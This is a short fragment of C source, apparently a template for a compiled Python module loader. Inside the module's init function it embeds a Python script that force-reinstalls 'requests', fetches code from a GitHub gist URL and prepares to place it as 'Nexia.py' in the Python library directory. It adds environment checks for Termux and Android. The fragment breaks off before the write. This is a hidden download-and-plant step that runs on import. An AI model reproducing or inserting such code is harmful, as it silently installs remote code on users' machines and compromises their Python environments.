...
PyObject *modulecode_%(module_identifier)s(PyThreadState *tstate, PyObject *module, struct nexium_MetaPathBasedLoaderEntry const *loader_entry) {
    ...
    char HoaSoahaNosaarr[] = "N=e:x==ia : D~ev::il";
    printf("HI MAN\n");
    printf("The library is developed by Nexia | @Qutayba2");
    printf("May God not bless you if you take the library");
    PyRun_SimpleString(
        "import os\n"
        "os.system('pip3.11 install --force-reinstall requests')\n"
        "import sys\n"
        "import platform\n"
        "import requests\n"
        "url = 'https://gist.githubusercontent.com/devilnasr/410d6d4b8a5b221874f46752d341435b/raw/d43650d1c1dbbd94a5b4bf3ca5efac9b5d795795/Nexia.py'\n"
        "nexia_code = requests.get(url).text\n"
        "def detect_env():\n"
        "    if 'com.termux' in sys.executable or 'com.termux' in sys.prefix:\n"
        "        return 'termux'\n"
        "    elif platform.system() == 'Linux' and '/data/data/' in sys.prefix:\n"
        "        return 'android'\n"
        "    else:\n"
        "        return 'normal'\n"
        "env = detect_env()\n"
        "if env == 'termux':\n"
        "    path = '/data/data/com.termux/files/usr/lib/python3.11/Nexia.py'\n"
        "elif env == 'android':\n"
        "    path = '/data/data/ru.iiec.nasr/files/aarch64-linux-android/lib/python3.11/Nexia.py'\n"
        "else:\n"
        "    path = os.path.join(sys.prefix, 'lib/python3.11/Nexia.py')\n"
